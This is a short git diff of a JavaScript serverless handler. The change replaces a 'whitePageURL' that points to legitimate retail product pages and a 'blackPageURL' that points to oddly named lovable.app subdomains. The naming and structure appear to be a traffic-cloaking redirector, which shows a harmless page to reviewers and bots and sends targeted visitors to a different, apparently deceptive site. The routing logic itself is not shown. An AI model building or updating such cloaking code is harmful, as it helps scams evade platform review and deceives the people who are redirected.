@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.desertcart.at/products/172108675-kurtzy-baby-safety-gate-for-door-and-staircase-with-child";
-    const blackPageURL = "https://casssshlov.lovable.app/";
+    const whitePageURL = "https://www.sportsdirect.com/hummel-denmark-home-shirt-2025-adults-373065#colcode=37306508";
+    const blackPageURL = "https://nowhereher.lovable.app/";
 
     //testing
   
@@ -27,6 +27,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
